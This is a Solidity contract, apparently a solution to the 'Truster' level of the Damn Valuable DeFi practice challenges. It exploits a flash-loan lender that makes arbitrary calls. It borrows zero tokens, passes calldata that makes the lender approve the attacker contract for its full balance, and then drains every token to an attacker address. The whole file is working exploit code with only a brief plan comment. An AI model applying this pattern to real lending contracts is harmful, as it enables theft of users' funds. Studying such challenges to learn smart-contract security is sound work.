// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract Borrower {
    address payable public lender;
    IERC20 public damnValuableToken;
    

    constructor(
        address payable _lender, 
        address tokenAddr
        ) {
        lender = _lender;
        damnValuableToken = IERC20(tokenAddr);
    }

    // Plan: borrow 0 tokens and pass in calldata that will call the approve function of DVT. 
    // After this the flashloan is returned and we call _transfer to send all funds to attacker
    function borrow(address payable _attacker) public {
            (bool success, ) = 
            lender.call(abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0,
                address(this),
                damnValuableToken,
                abi.encodeWithSignature(
                    "approve(address,uint256)", 
                    address(this),
                    damnValuableToken.balanceOf(lender)+1
                ))
            );
            require(success, "Call failed");

            _transfer(_attacker);

    }
    function _transfer(address payable _attacker) internal {
        damnValuableToken.transferFrom(lender, address(this), damnValuableToken.balanceOf(lender));
        damnValuableToken.transfer(_attacker, damnValuableToken.balanceOf(address(this)));        
    }

     
}